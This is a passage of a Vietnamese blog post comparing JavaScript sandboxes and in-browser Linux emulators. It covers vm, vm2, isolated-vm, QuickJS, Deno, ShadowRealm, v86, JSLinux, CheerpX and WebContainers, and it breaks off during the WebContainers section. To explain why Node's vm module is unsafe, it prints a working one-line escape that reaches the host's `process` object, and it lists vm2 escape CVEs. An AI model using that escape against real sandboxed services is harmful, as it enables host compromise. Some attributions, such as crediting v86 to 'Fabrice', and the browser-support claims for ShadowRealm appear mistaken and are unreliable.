---
itle: So sánh các giải pháp JavaScript cho mô phỏng nhân Linux
description: Một phân tích chuyên sâu về các bản tái hiện môi trường Linux
  bằng JavaScript/TypeScript.
date: 2026-05-28authors:
  - fox3000foxy
tags:
  - javascript
  - linux
  - analysis
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEQcreZmmVx1U8zFHwsD+JTDIUKtMP5RYijaEkOIqZVfXIKA/i3h0lslw+ZgUBlLXKW3OVA2tGM8svcJWTXDxS8A=="
author_sig: "yRR5+Zpa/LQk716EHPp2mOYQmoBxiZkEcyXCGJjDk8e9TmBvtQR9fijpLQTnLiTSlm+fgAMd9dqx4Mt4jn+HVA=="
---

# Mọi sandbox JavaScript, trình giả lập, trình mô phỏng và honeypot Linux -- được so sánh

Được rồi, tôi đã đi quá sâu vào cái hố thỏ này từ lâu rồi lol. Mọi chuyện bắt đầu vì tôi đang giúp trên [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- một dự án của Fortune (tôi sẽ nói về nó ngay) -- và mọi người cứ hỏi tôi "khoan đã, nó khác gì với `v86`?" hay "sao không dùng `vm2`?" -- và tôi nhận ra mình không thể trả lời rõ ràng nếu chưa lập bản đồ toàn bộ hệ sinh thái trước. Thế nên, đây rồi, chắc là vậy xD

Hóa ra có bốn họ riêng biệt -- sandbox JS, trình giả lập Linux, trình mô phỏng Linux, và honeypot -- và chúng hầu như không bao giờ chồng lấn, dù chúng ta liên tục nhắc đến chúng trong cùng một câu. Ai đó xây dựng hệ thống plugin thì dùng `isolated-vm`. Ai đó làm demo công cụ CLI thì dùng `v86`. Ai đó làm tình báo mối đe dọa SSH thì dùng Cowrie. Chúng giải quyết những vấn đề hoàn toàn khác nhau dưới cùng một cái ô mơ hồ "chạy code trong một cái hộp."

Tôi đã dành rất nhiều thời gian để đọc mã nguồn, báo cáo CVE, tài liệu kiến trúc và trang npm để viết bài này. Nó sẽ dài -- hãy pha một tách cà phê, nghiêm túc đấy. Hoặc hai.

> Disclaimer nhỏ: `typescript-virtual-container` được đề cao trong bài này vì nó là thứ đã châm ngòi cho nghiên cứu này. Tôi đã cố gắng công bằng với mọi thứ khác, nhưng hãy ghi nhớ bối cảnh này.

---

## Phần 0 -- Trước hết, bạn thực sự đang giải quyết vấn đề gì?

Trước khi đi sâu, cần phải chính xác về công dụng của từng họ, bởi vì thuật ngữ rất nhanh chóng trở nên lộn xộn và mọi người liên tục nhầm lẫn mọi thứ (kể cả tôi, trước khi tôi ngồi xuống và lập bản đồ mọi thứ một cách gọn gàng).

**Sandbox JS** cô lập mã JavaScript khỏi tiến trình Node.js chủ. Mô hình mối đe dọa là: mã JS không đáng tin cậy có thể gọi `process.exit()`, đọc file, hoặc khởi chạy tiến trình con. Giải pháp là một ranh giới xung quanh thực thi V8. Những công cụ này không có khái niệm về shell Linux, hệ thống file với quyền hạn, hay SSH.

**Trình giả lập Linux** chạy một nhân Linux thực, chưa sửa đổi trong một trình giả lập CPU (x86, RISC-V, OR1K) được triển khai bằng JavaScript hoặc WebAssembly. Bạn khởi động một hệ điều hành thực. Bạn có lời gọi hệ thống thực. Bạn có tương thích nhị phân với các chương trình biên dịch cho x86. Chi phí tài nguyên là rất lớn.

**Trình mô phỏng Linux** bắt chước *hành vi* của một hệ thống Linux mà không chạy nhân thực. Chúng triển khai một trình thông dịch shell, một hệ thống file ảo, và đủ ngữ nghĩa Unix để đánh lừa chương trình và con người. Không có nhân. Không có Wasm. Không có giả lập CPU. Tốn ít tài nguyên hơn nhiều.

**Honeypot** được thiết kế để thu hút kẻ tấn công và ghi lại những gì chúng làm. Chúng không phải chủ yếu là môi trường thực thi -- chúng là công cụ quan sát. Độ trung thực với hành vi thực của Linux chỉ quan trọng ở mức nó ngăn kẻ tấn công phát hiện ra cái bẫy.

Với khuôn khổ này, đây là vị trí của từng dự án trong bài viết:

```
JS sandbox :       vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Trình giả lập Linux :  v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Trình mô phỏng Linux : typescript-virtual-container (duy nhất trong không gian này)
Honeypot :         Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminal :   xterm.js + node-pty (không phải bộ cô lập, nhưng có liên quan)
```

---

## Phần 1 -- Các sandbox JavaScript

### 1.1 `vm` -- module gốc của Node.js (không phải như bạn nghĩ đâu)

Câu trả lời lâu đời nhất cho "chạy JS không đáng tin cậy" trong Node là module gốc `vm`. Nó đã tồn tại từ v0.1, nên nhiều người dùng nó đầu tiên -- và bị "cháy".

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Điều `vm` thực sự làm: nó tạo một context V8 mới (một tập hợp các hàm tạo gốc mới -- `Object`, `Array`, `Function`, v.v.) và thực thi mã bên trong, với tham chiếu chia sẻ tới những gì bạn đặt trong `sandbox`. Engine V8 của bạn không thay đổi. Tiến trình của bạn không thay đổi. Bộ nhớ được chia sẻ.

Lý do `vm` không cung cấp bất kỳ bảo mật nào: chuỗi nguyên mẫu (prototype chain) của JavaScript là một DAG kết nối mọi thứ với `Object.prototype`. Nếu bạn đặt một đối tượng từ thế giới chủ vào sandbox, khách có thể đi ngược chuỗi nguyên mẫu của nó và đến được các hàm tạo chủ. Từ `Function`, bạn có thể gọi `Function("return process")()` và lấy được `process` thật. Game over. Ngay lập tức, kiểu như vậy.

```js
// Đoạn này chạy hoàn hảo trong vm -- bạn lấy được process thật
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Ý tôi là, chính tài liệu của Node.js nói: "Module vm không phải là cơ chế bảo mật. Đừng dùng nó để chạy mã không đáng tin cậy." Cảnh báo này đã có từ lâu. Mọi người liên tục phớt lờ nó. Tôi đã thấy ứng dụng production dùng `vm` như sandbox. Làm ơn đừng làm thế xD

**Kết luận**: một cơ chế phạm vi, không phải sandbox. Dùng nó khi bạn cần cô lập biến (template engine, tính năng kiểu `eval` khi bạn kiểm soát mã). Không bao giờ dùng cho đầu vào không đáng tin cậy.

**Bộ nhớ**: chi phí không đáng kể -- cùng heap V8 với tiến trình chủ.  
**Bảo mật**: không có chống lại kẻ tấn công có động cơ.

---

### 1.2 `vm2` -- nỗ lực của cộng đồng, và cái chết rất dài

`vm2` là câu trả lời của cộng đồng cho vấn đề thoát của `vm`. Ý tưởng chính: bọc mọi đối tượng vượt qua ranh giới sandbox trong một `Proxy` chặn truy cập thuộc tính, ngăn leo chuỗi nguyên mẫu, và lọc các tham chiếu nguy hiểm. Ý tưởng thông minh về mặt lý thuyết! Không hẳn vậy trong thực tế, như chúng ta sẽ thấy.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // ném VMError, process không truy cập được
```

Trong nhiều năm, nó hoạt động khá tốt. Nhưng bề mặt tấn công của `Proxy` JavaScript là rất lớn. Mỗi tính năng ngôn ngữ JS mới -- generator, async iterator, `Symbol.toPrimitive`, `Error.prepareStackTrace`, các vị trí bên trong `Promise` -- đều là một vector vượt qua tiềm năng.

Dòng thời gian CVE là... một thứ gì đó. Kiểu, nhìn này:

| Ngày | CVE | Cơ chế |
|------|-----|-----------|
| Th10 2022 | CVE-2022-36067 | Thoát context chủ qua `Error.prepareStackTrace` |
| Th4 2023 | CVE-2023-29017 | Rò rỉ đối tượng chủ qua lỗi async không xử lý |
| Th4 2023 | CVE-2023-29199 | Vượt qua vệ sinh ngoại lệ qua `handleException()` |
| Th4 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Th5 2023 | CVE-2023-32314 | `Proxy` trên `Error.name` → `Function` → RCE |
| Th6 2023 | CVE-2023-37466 | Hàm async + tràn stack + `Proxy.getPrototypeOf` |
| Th7 2023 | CVE-2023-37903 | Worker thread + thoát qua eval |

Ba CVE nghiêm trọng trong cùng một tháng (tháng 4 năm 2023). BA. TRONG MỘT THÁNG. Sau CVE-2023-37903, người bảo trì chính thức tuyên bố ngừng sử dụng thư viện với dòng: *"Thư viện chứa các lỗ hổng bảo mật nghiêm trọng và không nên được sử dụng trong sản xuất."*

Người bảo trì đã hồi sinh nó vào tháng 10 năm 2025 với phiên bản 3.10.0, tuyên bố đã sửa mọi thứ đã biết vào thời điểm đó. Một lỗ hổng thoát nghiêm trọng mới (CVE-2026-22709, CVSS 9.8) đã được tiết lộ vào tháng 1 năm 2026, tiếp theo là một loạt mười một lỗ hổng khác vào tháng 5 năm 2026. Mười một. Mô hình không thay đổi và thành thật mà nói tôi không nghĩ nó sẽ thay đổi.

Vấn đề cơ bản là kiến trúc -- và đó là bài học mà toàn bộ hệ sinh thái đã mất một thời gian để học. Bạn không thể xây dựng một sandbox an toàn bằng cách sử dụng cùng ngôn ngữ mà bạn đang cô lập, trên cùng engine, trong cùng tiến trình. Bề mặt thoát là toàn bộ triển khai V8 -- và V8 là vài triệu dòng C++ liên tục thay đổi. Mỗi tính năng JS mới đều có thể mở ra một con đường tấn công mới.

**Kết luận**: Không sử dụng cho các ứng dụng nhạy cảm về bảo mật. Ngay cả trên phiên bản mới nhất, các cách vượt qua mới vẫn được phát hiện vài tháng một lần. Chính người bảo trì đã công khai thừa nhận điều này.

---

### 1.3 `isolated-vm` -- cái thực sự hoạt động

`isolated-vm` áp dụng cách tiếp cận đúng đắn: sử dụng nguyên thủy cô lập gốc của V8, Isolate. Mỗi Isolate V8 có heap riêng, garbage collector riêng, tập hợp các nội tại riêng, và không có tham chiếu chia sẻ nào với các Isolate khác.

Đây cũng chính là ranh giới mà Chrome sử dụng giữa các tab. Đó là một rào cản bảo mật thực sự, không phải mẹo ngôn ngữ xây dựng trên Proxy.

```js
import ivm from "isolated-vm";

// Mỗi isolate là heap V8 riêng của nó
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // giới hạn MB
const context = await isolate.createContext();
const jail = context.global;

// Truyền dữ liệu qua ranh giới yêu cầu tuần tự hóa rõ ràng
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Không thể với tới tiến trình chủ, heap chủ hoặc module chủ
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// Bạn có thể kết thúc mạnh khi hết thời gian hoặc vượt quá giới hạn bộ nhớ
isolate.dispose(); // giải phóng toàn bộ heap
```

Các kiểu `Reference` và `ExternalCopy` là cầu nối giao tiếp rõ ràng. Một `Reference` cấp cho isolate một handle có thể gọi tới một hàm chủ -- isolate có thể gọi nó nhưng không thể kiểm tra closure hay prototype của nó. Một `ExternalCopy` tuần tự hóa một giá trị (clone có cấu trúc) qua ranh giới heap. Mô hình cầu nối rõ ràng này không tiện lợi, nhưng chính nó làm cho sự cô lập trở nên thực sự.

Bạn có thể đặt các giới hạn tài nguyên nghiêm ngặt: bộ nhớ (isolate bị kết thúc nếu vượt quá giới hạn), timeout thời gian treo tường, và timeout CPU. Việc kết thúc là thực sự -- nó giết toàn bộ Isolate V8, không chỉ là timeout JS có thể bị vượt qua bằng `while(true)`.

**Giới hạn**: chỉ JS. Bạn không thể chạy bash bên trong. Không có khái niệm về file, quyền hạn, mạng hay tiến trình. Đó chính xác là công cụ phù hợp cho JS do người dùng gửi lên (plugin, formula, hook script), và là công cụ sai cho mọi thứ khác. Tác giả của `typescript-virtual-container` đã đề cập rằng cô ấy đã xem xét nó ban đầu trước khi nhận ra rằng "chạy lệnh shell" và "cô lập JavaScript" là những vấn đề hoàn toàn khác nhau.

**Bộ nhớ**: ~3-10 MB mỗi isolate rỗng, tăng lên khi sử dụng heap.  
**Bảo mật**: vững chắc. Ranh giới V8 Isolate là nguyên thủy cô lập thực sự.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- một engine JS riêng biệt được biên dịch sang Wasm

Một cách tiếp cận khác: thay vì cô lập trong V8, hãy chạy một engine JavaScript hoàn toàn riêng biệt được biên dịch sang WebAssembly. Chủ chạy trong V8/Node. Khách chạy trong QuickJS-trong-Wasm. Sandbox Wasm cung cấp ranh giới cô lập.

QuickJS vẫn là tác phẩm của Fabrice Bellard (cũng là người đứng sau QEMU, FFmpeg, JSLinux, TinyEMU -- người này không có thật, nghiêm túc đấy, làm sao một người có thể làm tất cả những thứ đó?). Đây là một engine JS nhỏ tuân thủ chuẩn ES2023 được viết bằng C, và khi biên dịch sang Wasm chỉ khoảng 500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Chạy trong QuickJS, hoàn toàn tách biệt khỏi V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS là một engine JavaScript nhỏ tuân thủ ES2023 được viết bằng C. Biên dịch sang Wasm, nó khoảng 500 KB cho biến thể đồng bộ, ~1 MB cho biến thể bất đồng bộ (Asyncify). Quản lý bộ nhớ là thủ công -- mỗi giá trị bạn trích xuất từ VM phải được giải phóng rõ ràng, hơi bất tiện nhưng ngăn chặn các bất ngờ về GC xuyên ranh giới. Một sự đánh đổi thú vị!

Wrapper `@sebastianwessel/quickjs` thêm một API tiện dụng hơn bên trên, với hệ thống file ảo tùy chọn, hỗ trợ fetch, và các module Node.js giả lập:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Mô hình bảo mật khác với `isolated-vm`: mô hình bộ nhớ tuyến tính của Wasm khiến khách không thể truy cập trực tiếp các đối tượng heap V8. Bề mặt tấn công là giao diện host↔Wasm (imports/exports), không phải toàn bộ ngôn ngữ JS. Điều này thường được coi là mạnh mẽ hơn các sandbox dựa trên Proxy.

Mặt trái: QuickJS không có cùng mức độ tối ưu hóa như V8. Đối với tải CPU-bound trong JS, nó chậm hơn 5 đến 20 lần so với V8. Đối với các đoạn mã nhỏ và đánh giá không đáng tin cậy, điều này thường không quan trọng.

**Bộ nhớ**: ~500 KB module Wasm + heap mỗi instance.  
**Bảo mật**: ranh giới Wasm, được coi là mạnh mẽ hơn các cách tiếp cận dựa trên Proxy.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- một runtime ưu tiên quyền hạn

Deno áp dụng một triết lý hoàn toàn khác: thay vì sandbox trong Node, hãy xây dựng một runtime mới an toàn theo mặc định. Tôi thực sự thích cách tiếp cận này -- đó là những gì Node.js đáng lẽ phải có ngay từ đầu, thành thật mà nói. Ryan Dahl (người tạo ra Node.js ban đầu) đã tạo ra Deno vì anh ấy hối tiếc về một số quyết định thiết kế của Node.js, điều này khá điên rồ khi nghĩ về nó.

Mọi khả năng nhạy cảm (đọc file, ghi file, mạng, môi trường, tiến trình con) đều yêu cầu một cờ `--allow-*` rõ ràng:

```bash
# Cái này chỉ có thể đọc trong /data, không gì khác
deno run --allow-read=/data script.ts

# Cái này chỉ có thể truy cập một domain duy nhất
deno run --allow-net=api.example.com script.ts

# Không có cờ = không có quyền nào
deno run untrusted.ts # không thể đọc, ghi, mạng, chạy
```

Mô hình quyền hạn được triển khai ở cấp Rust/OS -- không phải mẹo JS. Khi mã Deno gọi `Deno.readFile()`, nó đi qua một thao tác Rust kiểm tra bảng quyền trước khi chạm vào hệ thống file. Bạn không thể vượt qua nó từ JS vì lời gọi hệ thống không bao giờ xảy ra nếu quyền chưa được cấp.

Để chạy mã thực sự không đáng tin cậy, Deno Workers (Web Workers) cung cấp một isolate thứ hai trong cùng tiến trình, mỗi cái có bộ quyền riêng. Bạn có thể khởi chạy một worker với không quyền nào và giao tiếp với nó qua `postMessage`.

Deno 2 (phát hành tháng 10 năm 2024) đã thêm tương thích npm đầy đủ và các shim tương thích Node.js, cải thiện đáng kể việc áp dụng cho các trường hợp sử dụng phía máy chủ.

**Sự đánh đổi**: mô hình bảo mật của Deno rất tốt cho mã bạn có thể tin tưởng một phần. Đối với mã hoàn toàn không đáng tin cậy có thể chống đối, mô hình quyền hạn không giúp ích -- bạn cần một ranh giới Isolate (`isolated-vm`) hoặc một engine khác (`quickjs-emscripten`), bởi vì Deno vẫn sử dụng V8 và những kẻ tấn công tinh vi có thể tìm lỗi ở cấp V8.

---

### 1.6 TC39 ShadowRealm -- câu trả lời được chuẩn hóa (một ngày nào đó)

Tổ chức tiêu chuẩn hóa JavaScript (TC39) có một đề xuất gọi là ShadowRealm nhằm chuẩn hóa những gì `vm` và `vm2` đã cố gắng làm, nhưng với một mô hình bảo mật đúng đắn. Một ShadowRealm tạo ra một context thực thi JS bị cô lập với các nội tại riêng, không có quyền truy cập vào realm bên ngoài, và một giao diện import/export được kiểm soát cẩn thận.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Các nội tại riêng biệt, không có quyền truy cập realm bên ngoài
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm có sẵn trong trình duyệt (Chrome 90+, Firefox 105+) nhưng chưa có trong Node.js ổn định vào năm 2026. Đề xuất TC39 Compartments xây dựng dựa trên nó để cô lập ở cấp module. Đây là những câu trả lời được chuẩn hóa dài hạn, nhưng chúng chưa sẵn sàng cho production phía máy chủ Node. Đó là một trong những thứ bạn thấy từ xa nhưng... nó chỉ chưa ở đó thôi. TC39 cổ điển xD

---

### Tổng kết họ sandbox

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Ranh giới cô lập** | không có (phạm vi) | Proxy (hỏng) | V8 Isolate | Wasm | V8 Isolate + perms Rust |
| **Giới hạn bộ nhớ** | ❌ | ❌ | ✅ giới hạn chặt | ✅ heap Wasm | một phần |
| **Timeout CPU** | ❌ | ✅ (có thể vượt qua) | ✅ chặt | ✅ | ✅ |
| **Bảo mật** | không có | hỏng | vững chắc | vững chắc | vững chắc |
| **Tốc độ JS** | V8 gốc | V8 gốc | V8 gốc | ~10x chậm hơn | V8 gốc |
| **Trình duyệt** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Tương thích Node** | gốc | ✅ | ✅ | shim một phần | một phần |
| **Trạng thái** | ổn định | rủi ro (CVE mới) | ✅ hoạt động | ✅ hoạt động | ✅ hoạt động |
| **Chi phí RAM** | ~1 MB | ~5-20 MB | ~3-10 MB | ~5-15 MB | ~10-30 MB |

Kết luận: nếu bảo mật quan trọng với bạn, có chính xác hai lựa chọn thực sự -- `isolated-vm` (extension gốc, V8 Isolate, tốc độ JS đầy đủ) và `quickjs-emscripten` (Wasm, tương thích trình duyệt, ~10x chậm hơn cho tính toán nặng). Mọi thứ khác hoặc là "làm ơn đừng làm thế" (`vm`, `vm2`) hoặc là một runtime giải quyết một vấn đề hoàn toàn khác (Deno). ShadowRealm có thể thay đổi cuộc chơi một ngày nào đó, nhưng hiện tại thì chưa.

---

## Phần 2 -- Các trình giả lập Linux bằng JavaScript

Đây là lúc mọi thứ trở nên thực sự thú vị đối với tôi. Đây là những trình giả lập *thực sự* -- chúng triển khai một tập lệnh CPU bằng JavaScript hoặc WebAssembly, khởi động một ảnh nhân Linux thực sự, và thực thi các nhị phân người dùng thực sự. Sự cô lập đến từ việc khách và chủ không chia sẻ gì: không gian bộ nhớ khác nhau, luồng lệnh khác nhau.

Cái giá phải trả là rất lớn, nhưng những gì bạn nhận được thực sự đáng chú ý: một Linux thực sự, thực sự chạy, trong trình duyệt hoặc tiến trình Node của bạn. Kiểu, khá điên rồ khi nghĩ về nó, phải không?

### 2.1 `v86` -- trình giả lập PC x86 bằng JS + JIT Wasm

`v86` của Fabrice (copy trên GitHub) là trình giả lập x86 mã nguồn mở có khả năng nhất bằng JavaScript. Nó bắt đầu như một trình thông dịch JS thuần túy vào khoảng năm 2013 và đã phát triển thành một hệ thống JIT nơi các khối cơ bản x86 được dịch sang WebAssembly trong thời gian chạy, cải thiện đáng kể hiệu suất.

Những gì nó giả lập:
- **CPU**: x86-32 (IA-32), tập lệnh khoảng ở mức Pentium 1. Không có 64-bit (x86-64) -- đây là một giới hạn kiến trúc phần cứng, không phải tính năng bị thiếu.
- **FPU**: qua `Float64Array` của JavaScript. x87 có độ chính xác mở rộng 80-bit; double của JS là 64-bit. Điều này có nghĩa là kết quả dấu phẩy động có thể khác biệt nhẹ so với CPU thực.
- **Bộ nhớ**: có thể cấu hình, ánh xạ tới `SharedArrayBuffer` hoặc `ArrayBuffer` trong heap JS.
- **Phần cứng**: 8254 PIT (timer), 8259 PIC (bộ điều khiển ngắt), bộ điều khiển bàn phím 8042 (PS/2), CMOS RTC, VGA với các mở rộng SVGA và Bochs VBE, bộ điều khiển IDE, bộ điều khiển đĩa mềm (8272A), card mạng NE2000.
- **BIOS**: sử dụng SeaBIOS (BIOS x86 mã nguồn mở).

JIT hoạt động bằng cách xác định các khối cơ bản (chuỗi lệnh x86 không có nhảy), dịch chúng thành một hàm WebAssembly, lưu hàm đó vào bộ nhớ đệm, và gọi nó trong các lần thực thi tiếp theo của cùng khối. Các đường dẫn mã nóng đạt được hiệu suất Wasm gốc. Các đường dẫn nguội rơi trở lại trình thông dịch JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Chụp đầu ra serial (console nhân Linux)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Gửi đầu vào cho khách (gõ trong shell)
emulator.serial0_send("ls /\n");
```

**OS được hỗ trợ**: Alpine Linux (xuất sắc), Ubuntu 16.04/18.04 (chỉ i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (có hạn chế), MS-DOS.

**Thời gian khởi động**: 15-40 giây cho Alpine Linux từ ảnh sạch. Điều này vốn có từ việc khởi tạo nhân thực sự -- bạn không thể bỏ qua nó. Vâng, người dùng của bạn sẽ nhìn một nhân Linux khởi động trong trình duyệt của họ. Đó là thỏa thuận xD

**Bộ nhớ tối thiểu**: 100-256 MB mỗi instance. Riêng bộ nhớ đệm mã Wasm JIT có thể lên tới hàng chục MB cho một instance Linux bận rộn.

**Sử dụng trong Node.js**: được hỗ trợ đầy đủ. Không cần DOM -- đầu ra VGA có thể bỏ qua nếu bạn chỉ quan tâm đến đầu ra serial.

**Những gì bạn không thể làm**: chạy nhị phân 64-bit, sử dụng các tính năng nhân hiện đại (eBPF, io_uring, v.v.), hoặc chạy nhiều hơn một số ít instance đồng thời mà không chạm tới giới hạn bộ nhớ.

**npm**: [v86](https://www.npmjs.com/package/v86) -- được cập nhật liên tục, bản phát hành mới nhất cùng ngày khi tôi viết.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux và TinyEMU -- công trình của Bellard, hai lần

JSLinux là trình giả lập Linux bằng JavaScript của riêng Fabrice Bellard -- cái đầu tiên, được phát hành năm 2011. Tôi tiếp tục nhắc đến Bellard trong bài này vì ông ấy cứ xuất hiện: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Ông ấy là một người đặc biệt. Thực sự là một trong những đóng góp kỹ thuật cá nhân ấn tượng nhất trong lịch sử phần mềm, không hề phóng đại.

JSLinux gốc là một trình thông dịch x86 JS thuần túy. Năm 2016, Bellard viết TinyEMU (một trình giả lập RISC-V bằng C), biên dịch nó sang JavaScript qua Emscripten, và nó trở thành cơ sở của JSLinux hiện tại. Vậy nên JSLinux hiện tại thực ra là mã C tạo ra mã JavaScript -- hoàn toàn không phải JS viết tay.

Các ghi chú kỹ thuật trên trang web của Bellard rất đáng đọc: JSLinux hiện tại chạy CPU RISC-V 32 hoặc 64-bit (không phải x86), giả lập console VirtIO, mạng VirtIO, thiết bị khối VirtIO, và hệ thống file 9P để chia sẻ file với chủ. Demo JS được biên dịch từ C sử dụng Emscripten -- không phải JS viết tay.

TinyEMU tự nó hỗ trợ:
- RISC-V RV32IMAFDQC và RV64IMAFDQC (32 và 64-bit, với dấu phẩy động, nhân, lệnh nén)
- x86 qua KVM (chỉ native, không giả lập -- vì vậy phiên bản JS chỉ RISC-V)
- Console VirtIO, mạng, khối, đầu vào, hệ thống file 9P

TinyEMU có một demo JavaScript được cung cấp qua Emscripten. Nó là cơ sở của JSLinux và cũng được sử dụng bởi `container2wasm` (xem phần 2.5).

**Trạng thái JSLinux**: không có package npm, không có API lập trình. Nó là một demo bạn mở trong trình duyệt. Tầm quan trọng lịch sử là lớn -- nó đã chứng minh khái niệm. Tính hữu ích thực tế như một thư viện: không có.

**TinyEMU**: không có trên npm, mã nguồn C có sẵn tại [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- trình giả lập OR1K

jor1k là một trình giả lập OpenRISC 1000 (OR1K) được viết bằng JavaScript bởi Sebastian Macke. Nó thú vị về mặt lịch sử vì jor1k đã giới thiệu hỗ trợ hệ thống file VirtIO 9P, mà Bellard sau đó đã tích hợp vào TinyEMU và JSLinux. Sự thụ phấn chéo giữa các dự án này rất chặt chẽ -- chúng vay mượn lẫn nhau, đó thực sự là một trong những điều tuyệt vời nhất của công việc giả lập mã nguồn mở.

**Trạng thái**: không còn được bảo trì tích cực, không có package npm. Đã được lưu trữ ở thời điểm này. Hữu ích để biết chủ yếu cho bối cảnh lịch sử -- kiểu như nếu ai đó nhắc đến jor1k trong một cuộc trò chuyện, bây giờ bạn biết nó là gì :)

---

### 2.4 CheerpX -- trình giả lập x86 thương mại cho trình duyệt

CheerpX bởi Leaning Technologies là trình giả lập Linux x86 thương mại chất lượng production. Nó không phải mã nguồn mở, nhưng nó có khả năng hơn đáng kể so với v86 trong việc chạy một userspace Debian/Ubuntu thực sự. Nếu bạn cần một VSCode thực sự trong trình duyệt, đây là thứ bạn cần.

Khác biệt chính với v86:
- Hỗ trợ ISA rộng hơn (nhiều mở rộng x86 hơn, tương thích glibc tốt hơn)
- Hệ thống file dựa trên IndexedDB trong trình duyệt (bền vững giữa các lần tải lại trang)
- Hỗ trợ pthread qua `SharedArrayBuffer` (yêu cầu header COOP/COEP -- vâng những header bảo mật phiền phức đó)
- Được thiết kế để chạy VSCode, Python, Node.js, và các ứng dụng thực tế khác -- không chỉ ảnh OS tối thiểu
- Hỗ trợ chuyên nghiệp và SLA có sẵn (aka bạn có thể mắng ai đó nếu nó hỏng)

Trường hợp sử dụng điển hình là "chạy một ứng dụng Linux thực sự trong trình duyệt mà không cần máy chủ." Các công ty sử dụng nó cho IDE dựa trên trình duyệt, hướng dẫn lập trình, và tài liệu tương tác.

```js
// API CheerpX (đơn giản hóa)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Chuyện với Node.js**: CheerpX được thiết kế chủ yếu cho trình duyệt. Trình giả lập bên dưới về mặt lý thuyết có thể chạy trong Node (nó là Wasm), nhưng API và tài liệu hoàn toàn hướng đến sử dụng trong trình duyệt. Sử dụng phía máy chủ không được hỗ trợ.

**Bộ nhớ**: tương tự v86 -- 200+ MB cho một instance Debian thực sự.  
**Giá cả**: miễn phí cho dự án mã nguồn mở, giấy phép thương mại cho SaaS production.  
**Tài liệu**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js trong Wasm, không phải giả lập Linux

WebContainers thường được xếp chung với các trình giả lập Linux nhưng khác biệt về mặt kiến trúc. Chúng không giả lập x86. Chúng không khởi động Linux. Chúng chạy Node.js biên dịch sang WebAssembly sử dụng WASI. Sự khác biệt này rất quan trọng và tôi đã dành quá nhiều thời gian để bối rối về nó lol.

Tôi nghĩ sự nhầm lẫn đến từ marketing -- "chạy Node.js trong trình duyệt của bạn" nghe có vẻ giống giả lập, nhưng thực ra là chính Node.js được biên dịch sang Wasm, không phải một giả lập Linux chạy Node.js trong một VM. Một thứ hoàn toàn khác.

Kiến trúc:
1. Node.js được biên dịch sang Wasm (một runtime WASI tùy chỉnh cụ thể)
2. Một Service Worker chặn các yêu cầu mạng từ máy chủ Node.js được giả lập và định tuyến chúng đến tab trình duyệt
3. Hệ thống file sống trong bộ nhớ trình duyệt (không có E/S đĩa)
4. npm là một triển khai tùy chỉnh được tối ưu hóa cho sử dụng trong trình duyệt

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Viết file
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Chạy lệnh Node.js
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

